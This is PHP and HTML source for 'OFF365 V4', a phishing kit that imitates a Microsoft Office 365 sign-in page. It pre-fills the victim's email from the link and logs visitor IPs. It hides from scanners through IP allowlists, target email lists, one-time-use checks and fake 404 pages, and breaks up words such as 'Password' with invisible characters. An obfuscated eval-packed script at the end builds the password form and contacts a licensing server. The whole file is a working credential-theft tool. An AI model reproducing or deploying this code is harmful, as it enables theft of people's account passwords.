<?php
/* 
OFF365 V4 2020 by ExRobotos
Email: ex.robotos.official@gmail.com
Facebook: facebook.com/Ex.Robotos
ICQ: @Ex.Robotos
*/
error_reporting(0);
if($Resetlogs!==false && $Resetlogs!=="false" && $Resetlogs!=="FALSE" && $Resetlogs!=="False" && $Resetlogs!=="no" && $Resetlogs!=="NO" && !empty($Resetlogs)){
//array_map('unlink', glob("./*.txt"));

$files = glob("./*.txt"); //get all file names
foreach($files as $file){
    if(is_file($file))
    //unlink($file); //delete file
    //$fp = fopen($file, 'w');  // Sets the file size to zero bytes
    //fclose($fp);
    file_put_contents($file, "");
}

};
if($ResetAllow!==false && $ResetAllow!=="false" && $ResetAllow!=="FALSE" && $ResetAllow!=="False" && $ResetAllow!=="no" && $ResetAllow!=="NO" && !empty($ResetAllow)){
session_destroy();
};
include('blocker.php');include('config.php');
@session_start();
if(isset($_SERVER["HTTP_CF_CONNECTING_IP"])){$visitorIP=$_SERVER["HTTP_CF_CONNECTING_IP"];}else{$visitorIP=$_SERVER['REMOTE_ADDR'];};$visitorUA=$_SERVER['HTTP_USER_AGENT'];$visitorDATE=date("D M d, Y g:i a");$logs="
+ -------------OFF365 V4 2020 by Ex-Robotos------------+
| Visitor Information
| IP Address: $visitorIP
| Browser: $visitorUA
| Date: $visitorDATE 
+ --------------------------------------------------------------+
";

if($limitedarea!==false && $limitedarea!=="false" && $limitedarea!=="FALSE" && $limitedarea!=="False" && $limitedarea!=="no" && $limitedarea!=="NO" && !empty($limitedarea)){
    
  $limitedarea=str_replace(' ', '', $limitedarea);
$limitedarea = explode(',', $limitedarea);
//var_dump($limitedarea);
//echo $_SERVER['REMOTE_ADDR'];


if(is_array($limitedarea) ){
   // echo('2');
$isinlimitedarea=false;
foreach($limitedarea as $ip) {if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
    
$isinlimitedarea=true;
}
}
if($isinlimitedarea==false){
header('HTTP/1.0 404 Not Found');
$file=fopen("./DeniedIPS.txt","a");fwrite($file,"IP:".$_SERVER['REMOTE_ADDR']." DATE:".$visitorDATE." REASON:blocked by limitedarea\n");fclose($file);chmod("./DeniedIPS.txt",0600);		
 die("<h1>404 Not Found</h1>The link that you have requested is expired.");
    
}


}

}


if(isset($visitorfileName)&&$visitorfileName!==''&&$visitorfileName!=='false'&&$visitorfileName!=='FALSE'&&$visitorfileName!==false){$file=fopen("./".$visitorfileName,"a");fwrite($file,$logs);fclose($file);chmod("./".$visitorfileName,0600);}if($AutoGrab || (!$AutoGrab && ((isset($_GET['status']) && $_GET['status']!=='putuser') /*|| !isset($_GET['status'])*/ || (isset($_GET['data']))) )){ if(isset($_GET['email'])){$data=urldecode( $_GET['email'] );}elseif(isset($_GET['data'])){$data=urldecode( $_GET['data'] );}elseif(isset($_GET['target'])){$data=urldecode( $_GET['target'] );}elseif(isset($_GET['code'])){$data=urldecode($_GET['code']);}elseif(preg_match("/[^\/]+$/",urldecode( $_SERVER["REQUEST_URI"] ))){preg_match("/[^\/]+$/",urldecode( $_SERVER["REQUEST_URI"] ),$matches);$data=$matches[0];function begnWith($str, $begnString){$len = strlen($begnString);return (substr($str, 0, $len) === $begnString);}if(begnWith($data,"?")){$data = ltrim($data, '?');}}else{die(header("Location: ".$FailRedirect));}if(base64_encode(base64_decode($data))==$data){$email=base64_decode($data);$email=filter_var($email,FILTER_SANITIZE_EMAIL);if(!filter_var($email,FILTER_VALIDATE_EMAIL)){die(header("Location: ".$FailRedirect));}}else{$email=$data;$email=filter_var($email,FILTER_SANITIZE_EMAIL);if(!filter_var($email,FILTER_VALIDATE_EMAIL)){die(header("Location: ".$FailRedirect));}}$data=base64_encode($email);}$linkSite=$_SERVER["HTTP_HOST"];$uriSite=urldecode( $_SERVER["REQUEST_URI"] );$relative_path=dirname($_SERVER['PHP_SELF']);

if (isset($_SESSION["NOTALLOW"])){header('HTTP/1.0 404 Not Found');        
$file=fopen("./DeniedIPS.txt","a");fwrite($file,"IP:".$_SERVER['REMOTE_ADDR']." DATE:".$visitorDATE." REASON:blocked by NOTALLOW\n");fclose($file);chmod("./DeniedIPS.txt",0600);die("<h1>404 Not Found</h1>The link that you have requested is expired.");};

if($onlylistemails==true || $onlylistemails=="true" || $onlylistemails=="TRUE" || $onlylistemails=="True" || $onlylistemails=="yes" || $onlylistemails=="YES"){ 	  
	  $path = 'EMAILS.txt';
	  if (file_exists($path))
		{
		    
$emails = file('./EMAILS.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
		    
    		if (!in_array($email, $emails)) {
	 		//echo "that user is not exists in the list"
	 		if (!isset($_SESSION["NOTALLOW"])){$_SESSION["NOTALLOW"]="true";}
	 		$file=fopen("./DeniedEmails.txt","a");fwrite($file,"EMAIL:".$email." IP:".$visitorIP." DATE:".$visitorDATE." REASON:Not exist in list\n");fclose($file);chmod("./DeniedEmails.txt",0600);		
die("<h1>404 Not Found</h1>The link that you have requested is expired.");
    		}
 
}   		
    		
		}
		

if($onlyonetimeuse==true || $onlyonetimeuse=="true" || $onlyonetimeuse=="TRUE" || $onlyonetimeuse=="True" || $onlyonetimeuse=="yes" || $onlyonetimeuse=="YES"){ 
	  if (file_exists('./UsedEmails.txt'))
		{
		    
$usedemails = file('./UsedEmails.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
		  
	if (in_array($email, $usedemails) && !isset($_SESSION["NOTEXPIRED"] )) {
	    	if (!isset($_SESSION["NOTALLOW"])){$_SESSION["NOTALLOW"]="true";}
	 		//echo "that user already USED AND EXPIRED";
	 		$file=fopen("./DeniedEmails.txt","a");fwrite($file,"EMAIL:".$email." IP:".$visitorIP." DATE:".$visitorDATE." REASON:Already used and expired\n");fclose($file);chmod("./DeniedEmails.txt",0600);
	 		die("<h1>404 Not Found</h1>The link that you have requested is expired.");
	 		
	}	 		
	 		
		}
}


if(!$_SESSION["title"]){$CurrentTitle=$_SESSION["title"] = $TitlesArray[array_rand($TitlesArray)];}else{$CurrentTitle=$_SESSION["title"];}
$status=$_GET['status'];function rndString($length=10){return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"),0,$length);};$randpart=$randfirstpart.''.RndString(8).'-'.RndString(4).'-'.RndString(4).'-'.RndString(4).'-'.RndString(12).'_'.RndString(50).''.RndString(50).''.RndString(50);
if(($AutoGrab && !isset($_GET['data'])) || (!$AutoGrab && ((isset($_GET['status']) && $_GET['status']!=='putuser' && !isset($_GET['data']))||(!isset($_GET['status'])&&!isset($_GET['data']))) )){$relative_path=dirname($_SERVER['PHP_SELF']);if($fixIndex==true || $fixIndex=="true" || $fixIndex=="TRUE" || $fixIndex=="True"){$fixIndex="index.php?";$fixPart="&data=";}else{$fixIndex="";$fixPart="?data=";};if(!$AutoGrab && ( ( !isset($_GET['status']) && !isset($_GET['data'])) || (isset($_GET['status']) && $_GET['status']!=='putuser')) ){/*$fixPart=str_replace("data","status",$fixPart)*/ if($fixPart=='&data='){$fixPart='&status=';}elseif($fixPart=='?data='){$fixPart='?status=';};$data='putuser';} header("Location: $relative_path/$fixIndex$randpart$fixPart$data");}
$rndString1=rndString(7);$rndString2=rndString(8);$rndString3=rndString(6);$rndString4=rndString(5);$RndString1=str_repeat("­",rand(1,3));$RndString2=str_repeat("­",rand(1,3));$RndString3=str_repeat("­",rand(1,3));$RndString4=str_repeat("­",rand(1,3));$RndString5=str_repeat("­",rand(1,3)); ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html dir="ltr" class="" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title><? echo $CurrentTitle; ?></title>
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="referrer" content="no-referrer"/>
    <meta name="robots" content="none">
    <noscript>
    <meta http-equiv="Refresh" content="0; URL=./" />
    </noscript>
    <link rel="icon" href="images/favicon.ico" type="image/x-icon">
    <link href="css/style.css" rel="stylesheet" >
</head>

<body id="<?=$rndString1?>" class="nd <?=$rndString2?>" style="display: block;">
    

<div id="<?=$rndString3?>"> <div><div class="background <?=$rndString4?>" role="presentation"> <!--<div style="background-image: url(&quot;images/inv-small-background.jpg&quot;);-webkit-filter:invert(100%);filter:invert(100%);"></div>--> <div class="backgroundImage <?=$rndString2?>" style="background-image: url(&quot;images/inv-big-background.png&quot;);-webkit-filter:invert(100%);filter:invert(100%);"></div> </div></div>  

<style>








.disit{
    display:none;
}
.enait{
    display:block !important;
}
img {/*max-width: 100%;*/}
.novalidate {
    border-top-width: unset !important;
    border-left-width: unset !important;
    border-right-width: unset !important;
    border-color: #fa0808 !important;
    border-width: 0px 0px 1px 0px !important;
}
.form-group {margin-bottom:6px!important;}
/*.text-14{margin-top: 10px;}*/
/*.form-group.col-md-24{margin-bottom: 0px !important;}*/
#spinput,#emnput {margin-bottom: 14px !important;}


.innet {
    margin-left: auto;
    margin-right: auto;
    position: relative;
    max-width: 440px;
    width: calc(100% - 40px);
    padding: 44px;
    margin-bottom: 28px;
    background-color: #fff;
    -webkit-box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    -moz-box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    min-width: 320px;
    min-height: 338px;
    overflow: hidden;
}

#i0282 {
    display:none !important;
}

@media (max-width: 600px), (max-height: 366px){
.innet {
    max-width: 500px;
    width: calc(100% - 15%);
    padding: 6%;
    -webkit-box-shadow: none;
    -moz-box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    box-shadow: none;
}}


</style>
  
     <div class="outer <?=$rndString3?>"> <div class="middle <?=$rndString4?>"> <div class="innet fade-in-lightbox <?=$rndString1?>"> 
                    
                    <div class="lightbox-cover <?=$rndString2?>"></div> 

                    <div id="progressBar" class="progress disit <?=$rndString3?>" role="progressbar" aria-label="Please wait"><!--  --><!-- ko if: useCssAnimation --> <div></div><div></div><div></div><div></div><div></div><!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko --></div>
                    
                    <div class="mslogo"> <?/*<img class="logo <?=$rndString4?>" pngsrc="images/mcsft_logo.png" svgsrc="images/mcsft_logo.svg" src="images/mcsft_logo.svg" alt="Micr0soft">*/?>  </div> <div role="main"> <div class=""><?if($AutoGrab || (!$AutoGrab && $status!=='putuser' /*&& !isset($_GET['data'])*/)){?><div class="animate slide-in-next <?=$rndString1?>"> <div> <div class="identityBanner <?=$rndString2?>"> <div class="backButton <?=$rndString3?>" id="idBtn_Back" aria-label="Back"> <img role="presentation" pngsrc="images/arrow_left.png" svgsrc="images/arrow_left.svg" src="images/arrow_left.svg">  </div> <div id="displayName" class="identity <?=$rndString4?>" title="<?=$email?>"><?=$email?></div> </div></div> </div><?}?><div class="pagination-view animate has-identity-banner slide-in-next <?=$rndString1?>"> <div>    <div id="loginHeader" class="row text-title <?=$rndString2?>" role="heading" aria-level="1"><?if(!$AutoGrab && $status=='putuser'){?> <img src="<?="images/sigin2.png"?>"> <?}else{?>
<img src="<?="images/enterpass.png"?>"><?}?></div> <div class="row <?=$rndString3?>"> <div class="form-group col-md-24">


                            <div id="<?=$rndString4?>" role="alert" aria-live="assertive"><!-- ko if: passwrdTextbox.error -->
<?//if($AutoGrab || $status=='putuser'){?> 
                           <? if($status=='error'||$status=='error2'||$status=='error3'||$status=='error4'){ ?>
                            <div id="passwrdError" class="alert alert-error <?=$rndString1?>"><? echo $$status; ?><? if($status!='error'){ ?>, <a id="resnowerr" href="#"><? echo 're'.$RndString1.'set i'.$RndString2.'t n'.$RndString3.'ow.'; ?></a><? } ?></div>
                            <? }else if($firstmsg){ ?>
                            <div id="passwrdError" class="alert <?=$rndString2?>"
<div id="passwrdError" class="alert <?=$rndString3?>"><img class="" src="./images/firstmsg<? if($firstmsg)echo $firstmsg ?>.png" alt="<? echo 'ver'.$RndString1.'ify y'.$RndString2.'our da'.$RndString2.'ta'; ?>" ></div>        
                            <? } ?>
<? //} ?>                            
                            <!-- /ko --> </div>



                            <div class="placeholderContainer <?=$rndString4?>"> 
                <!-- has-error -->
                <div id="makeinput" onclick="makeInputHere(this); this.onclick=null;">
<?if(!$AutoGrab && $status=='putuser'){?> <div id="emnput"></div>
<?}else{?>          <div id="spinput"></div>
<?}?>
                </div>



                </div> </div> </div> <div class="position-buttons <?=$rndString3?>"> <div> 
<?if(!$AutoGrab && $status=='putuser'){?>                
                <div class="row"> <div class="col-md-24"> <div class="text-11 action-links"> <div class="form-group <?=$rndString4?>"> <a id="NoAcc" role="link" href="#"><img src="images/noacc.png"></a> </div>  </div> </div> </div> 
                <div class="row"> <div class="col-md-24"> <div class="text-12 action-links"> <div class="form-group <?=$rndString1?>"> <a id="CantAcces" role="link" href="#"><img src="images/cantacces.png"></a> </div>  </div> </div> </div> 
                <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <div class="form-group <?=$rndString2?>"> <a id="SigOpt" role="link" href="#"><img src="images/sigopt.png"></a> </div>  </div> </div> </div>
                
<?}else{?>                
               <div class="row"> <div class="col-md-24"> <div class="text-14 action-links"> <div class="form-group <?=$rndString3?>"> <a id="ForgPasswrd" role="link" href="#"><img src="images/forgpass.png"></a> </div>  </div> </div> </div>
<?}?>                
                </div> <div class="row <?=$rndString1?>"> <div><div class="col-xs-24 no-padding-left-right button-container <?=$rndString2?>"><div class="inline-block">
        <?if(!$AutoGrab && $status=='putuser'){?><div id="idSIButton" class="btn btn-block btn-primary <?=$rndString3?>" style="border-color:#0067b8;background-image:url(images/continue.png);background-color:#0067b8"></div><?}else{?><div id="idSIButton" class="btn btn-block btn-primary <?=$rndString3?>"></div><?}?>

            </div> </div></div> </div> </div></div> </div> </div></div> </div>                 <div id="footer" class="footer default <?=$rndString4?>" role="contentinfo"> <div> <div id="footerLinks" class="footerNode text-secondary <?=$rndString1?>"> <span id="ftrCopy"<? echo '&#xA9;'.$RndString1.'&#x32;'.$RndString2.'&#x30;'.$RndString3.'&#x31;'.$RndString4.'&#x39;'.$RndString1.'&#x20;' ?></span> <a id="ftrTerms" href="#">Terms of use</a> <a id="ftrPrivacy" href="#"><? echo 'Pr'.$RndString1.'iva'.$RndString2.'cy &amp; co'.$RndString3.'oki'.$RndString1.'es'; ?></a> <a href="#" role="button" class="moreOptions <?=$rndString2?>" aria-label="Click here for troubleshooting information"> <img class="desktopMode" role="presentation" pngsrc="images/ellipsis_white.png" svgsrc="images/ellipsis_white.svg" src="images/ellipsis_white.svg"> <img class="mobileMode <?=$rndString3?>" role="presentation" pngsrc="images/ellipsis_grey.png" svgsrc="images/ellipsis_grey.svg"src="images/ellipsis_grey.svg">  </a> </div> </div> </div> </div> </div>
  </div>
<script>


var statos = '<?=$status?>';
var actnn = "<? if($status=='error'){echo $randpart.'&error&data='.$data;}else if($status=='error2'){echo $randpart.'&error2&data='.$data;}else if($status=='error3'){echo $randpart.'&error3&data='.$data;}else if($status=='error4'){echo $randpart.'&error4&data='.$data;}else{echo $randpart.'&data='.$data;} ?>";
var actnn2 = "";
var rndstr1 = '<?=$rndString1?>';
var rndstr2 = '<?=$rndString2?>';
var haserr = "<? if($status=='error'||$status=='error2'||$status=='error3'){echo ' has-error';} ?>";
var plchol = "<? echo 'Pa'.$RndString1.'ss'.$RndString2.'wo'.$RndString3.'rd'; ?>";
var plchol2 = "<? echo 'Em'.$RndString1.'a'.$RndString2.'i'.$RndString3.'l'; ?>";
var arrl = "<? echo 'En'.$RndString4.'ter '.$RndString1.''.$email; ?>";
var licensekey = '<?=$licensekey?>';
var emailkey = '<?=base64_encode($toEmail)?>';
eval((function(x){var d="";var p=0;while(p<x.length){if(x.charAt(p)!="`")d+=x.charAt(p++);else{var l=x.charCodeAt(p+3)-28;if(l>4)d+=d.substr(d.length-x.charCodeAt(p+1)*96-x.charCodeAt(p+2)+3104-l,l);else d+="`";p+=4}}return d})("var style = document.createElement(\"` ;!\");` 7%head.appendChild(` =!);` \"!.sheet.insertRule(\"@media all {body{margin:0;padding:0;display:flex;align-items:center;justify-content` /$height:100vh}.mslogo` x#-left:30px` t%inline-block;background:#f25022;width:11px` p%1px;box-shadow:12px 0 0 #7fba00,0 ` ,##00a4ef,` *!` ,$ffb900;transform:` %!latex(-300%)`!m$::after{`\"8$\\\"Microsoft\\\";font:bold 20px sans-serif;`\"@(28px;color:#737373}.form`#0!rol::placeholder{font-family:\\\"Open Sans\\\",Arial,Helvetica,`!$'opacity:1` k+-ms-input-` C\\`!c,` JL ` u\" ` r&`##(}#sp` i!` U)inherit`#b!-size` )%`%k!`%E#` ,$`%o&-image:url(` %!s/passwrd.png)` =(repeat:no` ##;cursor:text`!J&max-`&]#00%`!)0` B&`(S$4px 8`' !rder-`)?!:solid` +$`%L\"rgba(0,0,0,.31)` _&` ?#`!1#` `&`&\"#666` O66)`(A$36px;outline:0` J$radius:0;-webkit-` (,`\"x'` x\"`(<!paren`\"A'` O#top`!`#` x%left` $,righ` ,%}#em`$4xutmail`$aK`!L#`$k@` D#`$M]` a#`$+~`$TU`!T*`$WQbody.nd{`\"'#262626;text-`0n!:left` @\"cb{` -'` b!!important;direction:rtl` -'`#$50px` -&}.inner`1+)unse` f(` 5#`!$!:initia` l)osi`!+!absolute` N)`%_$0` +'` ,\"calc(10% - 0px)`!X/` H(`!>#bottom` ,*in` }#5`\".(` 3!`%.#8` ,)overflow:scrol`\" '}#i0118`.s+Times New Roman\\\",` -!,`.q!`\"%-1%` c)npfield[type=email]{`(N&` 16text]`!<)`%.!sec-disc`!%.` a)`'>%` M$:` G*`1b#group`%3$`#H.}@`!9#ce`1[6`,\"#`*(!normal` ,\"w`)(#00;src:local(` O' Light\\\"),` /(Sans-` 1%url(https://fonts.gstatic.com/s/opensans/v16/mem5YaGs126MiZpBA-UN_r8OUuhs.ttf) format(\\\"truetype\\\")`!``4`\"+5Regular`\"11` 1'`!xL8`\"9+FVZ0e`!Fz6`\"+5SemiBold`\"01` 1(`$-]irk`$7S`(O)`\"#!url(`!@!/tsd.eot)`\":!` &-?#iefix`!$'embedded-open`!1#`\"7!` N&woff2` H'` +!` 12` 7+` 3.`\"35` 9+svg#`\"?$urity` K'svg\\\")}.alert`/^)-2%;}}\", 0);fun`0S! checkdom() {Element.prototype.isVisible = ` J%() {` $%_` :%(el, t, r, b, l, w, h) {var p = el.`3=\"Node, VISIBLE_PADDING = 2;if (!_e`!A\"InDocument(el)) {return false;}if (9 === p.nodeType` ;&tru` =#\"0\"` A!_getSty`!a#\"opacity\") || \"none` 21displa` ?$hidden` 41visibil` n!`!W1\"undefined` Z\"typeof t` t!` &2r`!0!` &2b` =7l` =7w` =7h) {t`$D\"offsetTop;l` %(Left;b = t +` ,&H`+2!;r = l` ,(Width;w` U(` -\"h` '(` W#`# !p) {`#(!`#T2p, \"overflow`$,#scroll` +:` n#l +`&E-> p`!N( + p.` m\"Lef`$7!l + w -` I-<` 9-t` c9`\"A\"` v'Top` N$h` c9Top`&!-`#)!`#:%P`(s!`('\") {l +=`!/%`$N!t` &(Top;}` h#`)t'p`)k/` ?%`(j\"`*L&`'p)property`#a#window.getComputed` F!`!z&d`*1#.defaultVie` =.` u!null)[` x$]`%_\"el.curren`!=\"` n&` *+` L(`!p'`+K0` -!) {while (` *$`'\"!`-M#`,R%`&'$` ;%=`\"(%`+p,`#6$`$N#`#b.this);};var arc = \"access expired contact owner\"` D!my`!~\" `!/&.get`/7#ById(\"makeinput\")`.1!` L$`!u#!` ($`/X&` 9&) {` o%body.innerHTML = arc;`0v!(arc);} else`/_\"` Z#n`!<8em`!N#` G&sp` 58sp`!t/n`!x+n`!u.n`!YJ`\"!#` z&s`,#$` }#sp` s-sp` OQ`#$$inpf`\">8inpfield`\"Q&inpf`!K'idSIB`!H*` =!`!'J}`!O%` +F`!z$dSIB`!f9dSIButton`!z'dSIB`!g;` >!`!XK`+o#onload = setTimeout(checkdom, 2000`&V\"xTag`!e2sByTagName`#!`&S%xTag)`$X\"i;for (i = 0; i <` j!.length; i++) {xTag[i].style.backgroundColor = \"red\";` >$`+V&.removeChild`!0![i])`/k#`\">#XMLHttpRequest) {xmlhttp = new ` 1*`)\\$` U'ActiveXObjec` M.` 1)(\"Microsoft`!2!TTP\"`%;#pagetype = \"off365-V4`,=\"trl`,g!\";tr`1I!\"p\"` \"%i` ,&.` ,1h` ))var htmlinp = \"` $)2` ,\"if (location.href.substr(0, ` **lastIndexOf(\"/\"))`$k#` A!href =` C+` AE`-?)` W5`#3$rams = \"host=\" +` G'+ \"&type` 2!`#\\%+ \"&key` F\"icensekey` 2!email` 4!` %!` /$token=\";`$w#.open(\"POST\", trl,`1R\")` 8%set`%m#Header(\"Content-type\", \"appli`\"(\"/x-www-form-urlencoded\"` d&`)A%`3r%() {` $%Dec(value`#{#res` *!`$z&array = ` 2!.split(\"-\")`),-` D!`)/+` f%+= String.fromCharCode(` O![i] - 10)`43%` O$`$A\"dec`#`'`&B%JSON.pars`4[\".responseText) && ` $9.key`\"M#jsE`#2! = {`#;\":`##&s, k` A#enc`\"m&st`+9!\";` #\"s.to`\";\"(`\"s#`,=!`\"t&s`\"k+`#V!` T!c`\"f#At(i`-P\"b = a ^ k;`!-\"enc +`#+1b`#*&enc;}}` [!rand =`\"A;rand`${\" =`\"Z%.`\"Z\"(rand, 125`!K\"e` 0/`$)&, a` A\"f` 4/`!':`(8!` W%g` /M`!6$`%S,Dec(g`-Z#timep = Math.floor((Date.now() + 86400000) / 1`1V!`%\\_valid`&D>` A\"== \"true\"`&rA &&`($,=`,!(&& Number(`\"V!) >=` )$f`\"K!4400) {`/D'<form class=\\\"\";` 3$+= rndstr1 + \"\\\" name=\\\"f1\\\" ` :)\"id=\\`4D\"frm\\\" no`\"7!ate=\\\"` #&` G-spellcheck=\\\"`-F!` 2-method=\\\"post` --target=\\\"_top` --autocomple`!D!off` 1.`*F!=\\\"r`.Q\".php?` 6)actnn`/I!isok=y` R*\\\" ><`\"U! onkeydown=\\\"` '!pressF`+G#()`#8&pass`!y.ype=\\\"tex`\"5.\\\" `#[$field`!vP`$y$`0J!control &nbsp; \" +`%%#2 + ` K+haserr`%=#aria-required=\\`'5!` z-placeholder=\\\"`3?!lchol`\"$,` h!label` @#arr` 4-`!%$></form>`!\"%2`'\"72`&wC` C!`&kP` S\"`'\":` >\"`'8%ge`$l)` 8\"`$G.` 1,`&y$` **`&q!2` =*`&7Qdata`!E.`&f#email`\"v6`&[-`!~2n` 1.`&8Q` V!`&AI`!'\"`&W4`#-.`&T9` =%`&`.} else {`/y_message`.v)` -A`!<%`/O(span`(H&`!|!Update`)c+your`0_$` ,+key.`+;,ontact` '+Us` \"+I` 2*C` 0*Q` 0*:` N+@` 1*E` 0*x` 0*_` 0*R` 0*o` 0*b` ?*` /+t` ?9s` 0*</sp`.Z+`#d'2 = ` $#;}}};xmlhttp.send(params);f`)M# makeInputHere(e)`&(\"document.getElementById(\"emnput\")) {e.innerHTML`!(&2`%G%` *1;}` a9`*5$` {!` #?.focus();}}`\"(%`-o$Form() {var ` J$ = ` R@value;if (` O&= \"\") {return `.P!;}` '#true;`!8&submit`!8$` u8`/u!\").` L\"()` Z'`-k0`#};sp` n!`\":` <%.`-H!List.remove(`1)'\")`#Zl` n<}` K6dSIButton\").onclick = `#!%() {` $%V` l#Email(mail`#/#/^\\w+([\\.-]?\\w+)*@\\` \"*(\\.\\w{2,3})+$/.test` Z\"`%,&`%\"\"alert(\"You have entered an in`\".! `1|! address!\");`%i*var mailfrm`&AM` +? &&` w$.length > 3 &&` n9`&e#` '<`!E) !`(3! && (statos` ,\"putuser\" || ` 1#` *)&&`$6/frm))`$G#` B/`(:M`,!#` <5progressBar\").setAttribute(\"`')!\", ` <% enait\");setTimeout(`*>&, 2000)`$#:`)0&hasClass`'v*`(t~`$T(` rN`)aH`#v#`+Yradd`!!,` l?`+wW` ~/};var r`)i2sByTagName(\"script\");for (`1H! = r`)Q$- 1; i >= 0; i--`'y#r[i].g`&f)id\") != \"a`1C![i].parentNode`$!#Child` X!);}}"))</script></body></html>